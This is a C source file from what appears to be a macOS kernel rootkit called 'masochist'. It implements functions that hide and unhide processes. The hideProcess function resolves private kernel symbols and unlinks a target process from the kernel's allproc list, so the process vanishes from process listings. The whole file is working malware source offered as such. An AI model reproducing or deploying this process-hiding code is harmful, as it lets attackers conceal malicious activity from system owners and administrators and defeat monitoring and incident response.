//
//  process.c
//  masochist
//
//  Created by Squiffy on 11/11/14.
//  Copyright (c) 2014 squiffypwn. All rights reserved.
//

#include <mach/mach_types.h>
#include <libkern/OSMalloc.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach/mach_types.h>
#include <sys/systm.h>
#include <stdbool.h>
#include "proc_internal.h"
#include "symbol.h"

struct hiddenProc {
    
    struct proc *process;
    OSMallocTag tag;
    
    LIST_ENTRY(hiddenProc) processes;
    
};

LIST_HEAD(hiddenProcsHead, hiddenProc) hidden_procs_head;

kern_return_t
hideProcess(pid_t pid) {
    
    /* Find the required symbols */
    struct proclist *allproc = find_symbol("_allproc");
    void (*proc_list_lock)(void) = find_symbol("_proc_list_lock");
    void (*proc_list_unlock)(void) = find_symbol("_proc_list_unlock");
    
    /* Make sure they're all resolved */
    if(!allproc || !proc_list_lock || !proc_list_unlock)
        return KERN_FAILURE;
    
    struct proc *process = NULL;
    
    /* Iterate through the entire process list just like Apple does */
    for (process = allproc->lh_first; process != 0; process = process->p_list.le_next) {
        
        /* If process is the process we're looking for, hide it */
        if(process->p_pid == pid) {
            /* XXX: Save into an array of hidden processes so we can recover it later */
            
            /* Lock the process list before we modify it */
            proc_list_lock();
            
            /* Actually hdie the process. */
            LIST_REMOVE(process, p_list);
            
            /* Add it to our list */
            char tagStr[101];
            snprintf(tagStr, 100, "hiddenProc-%i", process->p_pid);
            OSMallocTag tag = OSMalloc_Tagalloc(tagStr, OSMT_DEFAULT);
            struct hiddenProc *item = OSMalloc(sizeof(struct hiddenProc), tag);
            item->process = process;
            item->tag = tag;
            
            
            LIST_INSERT_HEAD(&hidden_procs_head, item, processes);
            
            /* Unlock the list */
            proc_list_unlock();
            
            return KERN_SUCCESS;
        }
        
    }
    
    return KERN_FAILURE;
    
}

kern_return_t
showProcess(pid_t pid) {
    
    struct hiddenProc *item;
    
    /* Find the required symbols */
    struct proclist *allproc = find_symbol("_allproc");
    void (*proc_list_lock)(void) = find_symbol("_proc_list_lock");
    void (*proc_list_unlock)(void) = find_symbol("_proc_list_unlock");
    
    LIST_FOREACH(item, &hidden_procs_head, processes) {
        
        if(item->process->p_pid == pid) {
            proc_list_lock();
            LIST_INSERT_HEAD(allproc, item->process, p_list);
            proc_list_unlock();
            OSFree(item, sizeof(struct hiddenProc), item->tag);
            return KERN_SUCCESS;
        }
    }
    
    return KERN_FAILURE;
}
